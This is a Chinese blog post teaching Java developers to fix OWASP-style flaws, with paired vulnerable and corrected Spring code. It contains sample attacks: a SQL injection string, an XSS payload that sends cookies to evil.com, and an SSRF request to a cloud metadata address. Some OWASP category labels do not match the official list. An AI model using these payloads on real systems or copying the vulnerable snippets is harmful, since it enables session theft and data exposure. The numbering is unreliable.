# OWASP Top 10：Java 开发者安全防护指南

<div class="post-meta">📅 2025-11-20 &nbsp;·&nbsp; 🏷️ <span class="tag">安全</span> <span class="tag">OWASP</span></div>

OWASP Top 10 是 Web 应用安全领域最权威的漏洞清单，Java 开发者必须掌握。

---

## 一、A01 访问控制失效

```java
// 漏洞：URL 参数替换即可访问他人数据
@GetMapping("/order/{id}")
public Order getOrder(@PathVariable Long id) {
    return orderService.getById(id);  // 未检查是否属于当前用户！
}

// 修复：校验资源归属
@GetMapping("/order/{id}")
public Order getOrder(@PathVariable Long id) {
    Long currentUserId = SecurityUtils.getCurrentUserId();
    Order order = orderService.getById(id);
    if (!order.getUserId().equals(currentUserId)) {
        throw new AccessDeniedException("无权访问此订单");
    }
    return order;
}
```

## 二、A02 加密失效

```java
// 漏洞：使用 MD5 存储密码（彩虹表攻击）
String hash = DigestUtils.md5Hex(password);  // ❌

// 修复：BCrypt（内置 salt，计算慢，防暴力破解）
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);  // 强度越高越慢，12是推荐值
}

// 存储
String encoded = passwordEncoder.encode(rawPassword);
// 验证
boolean matches = passwordEncoder.matches(rawPassword, encodedPassword);
```

## 三、A03 注入攻击（SQL 注入）

```java
// 漏洞：字符串拼接 SQL
String sql = "SELECT * FROM user WHERE name = '" + username + "'";
// 攻击输入：' OR '1'='1  → 查出所有用户

// 修复方案1：MyBatis 使用 #{} 参数绑定
@Select("SELECT * FROM user WHERE name = #{username}")
User findByName(String username);
// #{} 自动参数化，${} 是字符串替换（仅用于列名/表名）

// 修复方案2：JPA 命名参数
@Query("SELECT u FROM User u WHERE u.name = :name")
User findByName(@Param("name") String name);
```

## 四、A04 不安全设计（IDOR）

```
IDOR（Insecure Direct Object Reference）：
直接用用户可控的 ID 访问对象，不验证权限

防御：
1. 接口层面强制校验资源归属（见 A01）
2. 对外暴露的 ID 使用 UUID 而非自增 ID
   → 攻击者无法枚举（1,2,3...）
3. 敏感操作需要二次认证
```

## 五、A05 安全配置错误

```yaml
# 生产环境检查清单

# ❌ 错误：Actuator 所有端点全开放
management:
  endpoints:
    web:
      exposure:
        include: "*"

# ✅ 正确：只开放 health
management:
  endpoints:
    web:
      exposure:
        include: health
  endpoint:
    health:
      show-details: never  # 不暴露详细信息

# ❌ 错误：Spring Security 放行所有
.anyRequest().permitAll()

# ✅ 正确：明确放行路径
.requestMatchers("/api/public/**").permitAll()
.anyRequest().authenticated()
```

## 六、A06 XSS（跨站脚本）

```java
// 漏洞：直接输出用户输入到 HTML
// <div>${userInput}</div>
// 攻击输入：<script>document.location='http://evil.com/steal?c='+document.cookie</script>

// 修复1：输出转义（Thymeleaf 默认转义）
// <div th:text="${userInput}"></div>  ← 自动转义

// 修复2：对富文本内容使用 XSS 过滤库
<dependency>
  <groupId>org.jsoup</groupId>
  <artifactId>jsoup</artifactId>
</dependency>

String safeHtml = Jsoup.clean(unsafeHtml, Safelist.basicWithImages());

// 修复3：CSP 响应头
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> 
            csp.policyDirectives("default-src 'self'; script-src 'self'"))
    );
}
```

## 七、A07 认证失败

```java
// 防暴力破解：登录失败次数限制
@PostMapping("/login")
public TokenResponse login(@RequestBody LoginRequest req) {
    String lockKey = "login:lock:" + req.getUsername();
    String countKey = "login:fail:" + req.getUsername();
    
    if (redisTemplate.hasKey(lockKey)) {
        throw new BusinessException("账号已锁定，请15分钟后重试");
    }
    
    try {
        // 验证逻辑
        return doLogin(req);
    } catch (BadCredentialsException e) {
        Long count = redisTemplate.opsForValue().increment(countKey);
        redisTemplate.expire(countKey, Duration.ofMinutes(15));
        
        if (count >= 5) {
            redisTemplate.opsForValue().set(lockKey, "1", Duration.ofMinutes(15));
            throw new BusinessException("密码错误超过5次，账号已锁定15分钟");
        }
        throw new BusinessException("用户名或密码错误，还剩 " + (5 - count) + " 次机会");
    }
}
```

## 八、A08 SSRF（服务端请求伪造）

```java
// 漏洞：服务端发起用户指定的 URL 请求
@GetMapping("/fetch")
public String fetch(String url) {
    return restTemplate.getForObject(url, String.class);
    // 攻击者可用 http://169.254.169.254/metadata 访问云服务器元数据
}

// 修复：白名单 + 禁止内网 IP
private void validateUrl(String url) {
    URI uri = URI.create(url);
    if (!List.of("example.com", "api.trusted.com").contains(uri.getHost())) {
        throw new IllegalArgumentException("不允许访问此域名");
    }
    InetAddress addr = InetAddress.getByName(uri.getHost());
    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress()) {
        throw new IllegalArgumentException("不允许访问内网地址");
    }
}
```

## 总结

| 漏洞 | 防御核心 |
|------|---------|
| A01 访问控制 | 每个资源操作验证归属权 |
| A02 加密 | BCrypt 存密码，HTTPS 传输 |
| A03 注入 | MyBatis `#{}` 参数绑定 |
| A05 配置错误 | 生产环境关闭 Swagger/Actuator |
| A06 XSS | 输出转义 + CSP 响应头 |
| A07 认证 | 失败次数限制 + 强密码要求 |
| A08 SSRF | 白名单 + 禁止内网 IP |
